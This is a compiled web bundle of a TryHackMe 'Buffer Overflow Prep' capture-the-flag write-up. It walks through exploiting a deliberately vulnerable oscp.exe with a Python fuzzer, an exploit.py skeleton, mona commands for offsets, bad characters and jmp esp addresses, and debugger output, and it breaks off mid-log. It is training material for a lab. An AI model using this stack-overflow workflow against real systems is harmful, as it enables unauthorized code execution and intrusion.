"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[7341],{3905:(e,t,n)=>{n.d(t,{Zo:()=>x,kt:()=>c});var a=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,o=function(e,t){if(null==e)return{};var n,a,o={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var i=a.createContext({}),A=function(e){var t=a.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},x=function(e){var t=A(e.components);return a.createElement(i.Provider,{value:t},e.children)},p="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},f=a.forwardRef((function(e,t){var n=e.components,o=e.mdxType,r=e.originalType,i=e.parentName,x=s(e,["components","mdxType","originalType","parentName"]),p=A(n),f=o,c=p["".concat(i,".").concat(f)]||p[f]||u[f]||r;return n?a.createElement(c,l(l({ref:t},x),{},{components:n})):a.createElement(c,l({ref:t},x))}));function c(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var r=n.length,l=new Array(r);l[0]=f;var s={};for(var i in t)hasOwnProperty.call(t,i)&&(s[i]=t[i]);s.originalType=e,s[p]="string"==typeof e?e:o,l[1]=s;for(var A=2;A<r;A++)l[A]=n[A];return a.createElement.apply(null,l)}return a.createElement.apply(null,n)}f.displayName="MDXCreateElement"},45607:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>l,default:()=>u,frontMatter:()=>r,metadata:()=>s,toc:()=>A});var a=n(87462),o=(n(67294),n(3905));const r={},l="Buffer Overflow Prep",s={unversionedId:"Tryhackme/Buffer Overflow Prep/Buffer Overflow Prep",id:"Tryhackme/Buffer Overflow Prep/Buffer Overflow Prep",title:"Buffer Overflow Prep",description:"Practice stack based buffer overflows!",source:"@site/writeups/Tryhackme/Buffer Overflow Prep/Buffer Overflow Prep.md",sourceDirName:"Tryhackme/Buffer Overflow Prep",slug:"/Tryhackme/Buffer Overflow Prep/",permalink:"/writeups/Tryhackme/Buffer Overflow Prep/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Brute It",permalink:"/writeups/Tryhackme/Brute It/"},next:{title:"Burp Suite",permalink:"/writeups/Tryhackme/Burp Suite/Burpsuite"}},i={},A=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Deploy VM",id:"task-1-deploy-vm",level:2},{value:"Task 2 oscp.exe - OVERFLOW1",id:"task-2-oscpexe---overflow1",level:2},{value:"Task 3 oscp.exe - OVERFLOW2",id:"task-3-oscpexe---overflow2",level:2},{value:"Task 4 oscp.exe - OVERFLOW3",id:"task-4-oscpexe---overflow3",level:2},{value:"Task 5 oscp.exe - OVERFLOW4",id:"task-5-oscpexe---overflow4",level:2},{value:"Task 6 oscp.exe - OVERFLOW5",id:"task-6-oscpexe---overflow5",level:2},{value:"Task 7 oscp.exe - OVERFLOW6",id:"task-7-oscpexe---overflow6",level:2},{value:"Task 8 oscp.exe - OVERFLOW7",id:"task-8-oscpexe---overflow7",level:2},{value:"Task 9 oscp.exe - OVERFLOW8",id:"task-9-oscpexe---overflow8",level:2},{value:"Task 10 oscp.exe - OVERFLOW9",id:"task-10-oscpexe---overflow9",level:2},{value:"Task 11 oscp.exe - OVERFLOW10",id:"task-11-oscpexe---overflow10",level:2}],x={toc:A},p="wrapper";function u(e){let{components:t,...r}=e;return(0,o.kt)(p,(0,a.Z)({},x,r,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"buffer-overflow-prep"},"Buffer Overflow Prep"),(0,o.kt)("p",null,"Practice stack based buffer overflows!"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/bufferoverflowprep"},"Buffer Overflow Prep")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Reverse Engineering"),(0,o.kt)("li",{parentName:"ul"},"Buffer Overflow")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-deploy-vm"},"Task 1 Deploy VM"),(0,o.kt)("p",null,"This room uses a 32-bit Windows 7 VM with Immunity Debugger and Putty preinstalled. Windows Firewall and Defender have both been disabled to make exploit writing easier."),(0,o.kt)("p",null,"You can log onto the machine using RDP with the following credentials: admin/password"),(0,o.kt)("p",null,"I suggest using the xfreerdp command: ",(0,o.kt)("inlineCode",{parentName:"p"},"xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP")),(0,o.kt)("p",null,'If Windows prompts you to choose a location for your network, choose the "Home" option.'),(0,o.kt)("p",null,'On your Desktop there should be a folder called "vulnerable-apps". Inside this folder are a number of binaries which are vulnerable to simple stack based buffer overflows (the type taught on the PWK/OSCP course):'),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"The SLMail installer."),(0,o.kt)("li",{parentName:"ul"},"The brainpan binary."),(0,o.kt)("li",{parentName:"ul"},"The dostackbufferoverflowgood binary."),(0,o.kt)("li",{parentName:"ul"},"The vulnserver binary."),(0,o.kt)("li",{parentName:"ul"},'A custom written "oscp" binary which contains 10 buffer overflows, each with a different EIP offset and set of badchars.')),(0,o.kt)("p",null,"I have also written a handy guide to exploiting buffer overflows with the help of mona: ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst"},"https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst")),(0,o.kt)("p",null,"Please note that this room does not teach buffer overflows from scratch. It is intended to help OSCP students and also bring to their attention some features of mona which will save time in the OSCP exam."),(0,o.kt)("p",null,"Thanks go to ",(0,o.kt)("a",{parentName:"p",href:"https://twitter.com/Mojodojo_101"},"@Mojodojo_101")," for helping create the custom oscp.exe binary for this room!"),(0,o.kt)("p",null,"Deploy the VM and login using RDP."),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("h2",{id:"task-2-oscpexe---overflow1"},"Task 2 oscp.exe - OVERFLOW1"),(0,o.kt)("p",null,'Right-click the Immunity Debugger icon on the Desktop and choose "Run as administrator".'),(0,o.kt)("p",null,'When Immunity loads, click the open file icon, or choose File -> Open. Navigate to the vulnerable-apps folder on the admin user\'s desktop, and then the "oscp" folder. Select the "oscp" (oscp.exe) binary and click "Open".'),(0,o.kt)("p",null,'The binary will open in a "paused" state, so click the red play icon or choose Debug -> Run. In a terminal window, the oscp.exe binary should be running, and tells us that it is listening on port 1337.'),(0,o.kt)("p",null,"On your Kali box, connect to port 1337 on MACHINE_IP using netcat: ",(0,o.kt)("inlineCode",{parentName:"p"},"nc MACHINE_IP 1337")),(0,o.kt)("p",null,'Type "HELP" and press Enter. Note that there are 10 different OVERFLOW commands numbered 1 - 10. Type "OVERFLOW1 test" and press enter. The response should be "OVERFLOW1 COMPLETE". Terminate the connection.'),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Buffer Overflow Prep$ nc 192.168.178.56 1337\nWelcome to OSCP Vulnerable Server! Enter HELP for help.\nHELP\nValid Commands:\nHELP\nOVERFLOW1 [value]\nOVERFLOW2 [value]\nOVERFLOW3 [value]\nOVERFLOW4 [value]\nOVERFLOW5 [value]\nOVERFLOW6 [value]\nOVERFLOW7 [value]\nOVERFLOW8 [value]\nOVERFLOW9 [value]\nOVERFLOW10 [value]\nEXIT\n")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Mona Configuration")),(0,o.kt)("p",null,"The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"!mona config -set workingfolder c:\\mona\\%p")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Fuzzing")),(0,o.kt)("p",null,"Create a file on your Kali box called fuzzer.py with the following contents:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},'import socket, time, sys\n\nip = "MACHINE_IP"\nport = 1337\ntimeout = 5\n\nbuffer = []\ncounter = 100\nwhile len(buffer) < 30:\n    buffer.append("A" * counter)\n    counter += 100\n\nfor string in buffer:\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(timeout)\n        connect = s.connect((ip, port))\n        s.recv(1024)\n        print("Fuzzing with %s bytes" % len(string))\n        s.send("OVERFLOW1 " + string + "\\r\\n")\n        s.recv(1024)\n        s.close()\n    except:\n        print("Could not connect to " + ip + ":" + str(port))\n        sys.exit(0)\n    time.sleep(1)\n')),(0,o.kt)("p",null,"Run the fuzzer.py script using python: ",(0,o.kt)("inlineCode",{parentName:"p"},"python fuzzer.py")),(0,o.kt)("p",null,'The fuzzer will send increasingly long strings comprised of As (up to 3000). If the fuzzer crashes the server with one of the strings, you should see an error like: "Could not connect to MACHINE_IP:1337". Make a note of the largest number of bytes that were sent.'),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Buffer Overflow Prep$ python fuzzer.py\nFuzzing with 100 bytes\nFuzzing with 200 bytes\nFuzzing with 300 bytes\nFuzzing with 400 bytes\nFuzzing with 500 bytes\nFuzzing with 600 bytes\nFuzzing with 700 bytes\nFuzzing with 800 bytes\nFuzzing with 900 bytes\nFuzzing with 1000 bytes\nFuzzing with 1100 bytes\nFuzzing with 1200 bytes\nFuzzing with 1300 bytes\nFuzzing with 1400 bytes\nFuzzing with 1500 bytes\nFuzzing with 1600 bytes\nFuzzing with 1700 bytes\nFuzzing with 1800 bytes\nFuzzing with 1900 bytes\nFuzzing with 2000 bytes\nCould not connect to 192.168.178.56:1337\n")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(63922).Z,width:"384",height:"299"})),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Crash Replication & Controlling EIP")),(0,o.kt)("p",null,"Create another file on your Kali box called exploit.py with the following contents:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},'import socket\n\nip = "MACHINE_IP"\nport = 1337\n\nprefix = "OVERFLOW1 "\noffset = 0\noverflow = "A" * offset\nretn = ""\npadding = ""\npayload = ""\npostfix = ""\n\nbuffer = prefix + overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    s.connect((ip, port))\n    print("Sending evil buffer...")\n    s.send(buffer + "\\r\\n")\n    print("Done!")\nexcept:\n    print("Could not connect.")\n')),(0,o.kt)("p",null,"Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the -l value to this):"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Buffer Overflow Prep$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9\n")),(0,o.kt)("p",null,"Copy the output and place it into the payload variable of the exploit.py script."),(0,o.kt)("p",null,"On Windows, in Immunity Debugger, re-open the oscp.exe again using the same method as before, and click the red play icon to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications)."),(0,o.kt)("p",null,"On Kali, run the modified exploit.py script: ",(0,o.kt)("inlineCode",{parentName:"p"},"python exploit.py")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Buffer Overflow Prep$ python exploit.py\nSending evil buffer...\nDone!\n")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(54662).Z,width:"846",height:"26"})),(0,o.kt)("p",null,"The script should crash the oscp.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"!mona findmsp -distance 600")),(0,o.kt)("p",null,'Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).'),(0,o.kt)("p",null,"In this output you should see a line which states:"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"EIP contains normal pattern : ... (offset XXXX)")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"0BADF00D   [+] Examining registers\n0BADF00D       EIP contains normal pattern : 0x6f43396e (offset 1978)\n0BADF00D       ESP (0x00a9fa18) points at offset 1982 in normal pattern (length 418)\n")),(0,o.kt)("p",null,'Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".'),(0,o.kt)("p",null,"Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242)."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Finding Bad Characters")),(0,o.kt)("p",null,"Generate a bytearray using mona, and exclude the null byte (\\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\\mona\\oscp\\bytearray.bin)."),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},'!mona bytearray -b "\\x00"')),(0,o.kt)("p",null,"Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \\x01 to \\xff:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},'from __future__ import print_function\n\nfor x in range(1, 256):\n    print("\\\\x" + "{:02x}".format(x), end=\'\')\n\nprint()\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Buffer Overflow Prep$ python badchar.py\n\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\n")),(0,o.kt)("p",null,"Update your exploit.py script and set the payload variable to the string of bad chars the script generates."),(0,o.kt)("p",null,"Restart oscp.exe in Immunity and run the modified exploit.py script again. Make a note of the address to which the ESP register points and use it in the following mona command:"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"!mona compare -f C:\\mona\\oscp\\bytearray.bin -a <address>")),(0,o.kt)("p",null,'A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.'),(0,o.kt)("p",null,"Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string."),(0,o.kt)("p",null,"The first badchar in the list should be the null byte (\\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \\x00. Then update the payload variable in your exploit.py script and remove the new badchars as well."),(0,o.kt)("p",null,'Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.'),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"\\x00\\x07\\x2e\\xa0")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Finding a Jump Point")),(0,o.kt)("p",null,"With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \\x00):"),(0,o.kt)("p",null,'!mona jmp -r esp -cpb "\\x00"'),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},'!mona jmp -r esp -cpb "\\x00\\x07\\x2e\\xa0"')),(0,o.kt)("p",null,'This command finds all "jmp esp" (or equivalent) instructions with addresses that don\'t contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).'),(0,o.kt)("p",null,'Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \\x01\\x02\\x03\\x04 in Immunity, write it as \\x04\\x03\\x02\\x01 in your exploit.'),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"Log data\nAddress    Message\n           Immunity Debugger 1.85.0.0 : R'lyeh\n           Need support? visit http://forum.immunityinc.com/\n           \"C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\oscp.exe\"\n\n           Console file 'C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\oscp.exe'\n           [16:45:37] New process with ID 000015F8 created\n004012D0   Main thread with ID 0000155C created\n77C70D90   New thread with ID 00000144 created\n77C70D90   New thread with ID 00001AA0 created\n00400000   Modules C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\oscp.exe\n62500000   Modules C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\essfunc.dll\n75AE0000   Modules C:\\Windows\\System32\\KERNELBASE.dll\n75DA0000   Modules C:\\Windows\\System32\\msvcrt.dll\n76E80000   Modules C:\\Windows\\System32\\KERNEL32.DLL\n772F0000   Modules C:\\Windows\\System32\\WS2_32.dll\n77A70000   Modules C:\\Windows\\System32\\RPCRT4.dll\n77C20000   Modules C:\\Windows\\SYSTEM32\\ntdll.dll\n004012D0   [16:45:38] Program entry point\n           [16:46:37] Thread 00000144 terminated, exit code 0\n           [16:46:37] Thread 00001AA0 terminated, exit code 0\n00401973   New thread with ID 00000784 created\n42424242   [16:47:17] Access violation when executing [42424242]\n0BADF00D   [+] Command used:\n0BADF00D   !mona jmp -r esp -cpb \"\\x00\\x07\\x2e\\xa0\"\n\n           ---------- Mona command started on 2020-11-19 16:47:22 (v2.0, rev 613) ----------\n0BADF00D   [+] Processing arguments and criteria\n0BADF00D       - Pointer access level : X\n0BADF00D       - Bad char filter will be applied to pointers : \"\\x00\\x07\\x2e\\xa0\"\n0BADF00D   [+] Generating module info table, hang on...\n0BADF00D       - Processing modules\n0BADF00D       - Done. Let's rock 'n roll.\n0BADF00D   [+] Querying 2 modules\n0BADF00D       - Querying module essfunc.dll\n750A0000   Modules C:\\Windows\\system32\\mswsock.dll\n0BADF00D       - Querying module oscp.exe\n0BADF00D       - Search complete, processing results\n0BADF00D   [+] Preparing output file 'jmp.txt'\n0BADF00D       - (Re)setting logfile jmp.txt\n0BADF00D   [+] Writing results to jmp.txt\n0BADF00D       - Number of pointers of type 'jmp esp' : 9\n0BADF00D   [+] Results :\n625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\essfunc.dll)\n625011BB     0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\essfunc.dll)\n625011C7     0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\essfunc.dll)\n625011D3     0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\essfunc.dll)\n625011DF     0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\essfunc.dll)\n625011EB     0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\essfunc.dll)\n625011F7     0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\essfunc.dll)\n62501203     0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\Admin\\Desktop\\Buffer Overflow Prep\\oscp\\essfunc.dll)\n62501205     0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- 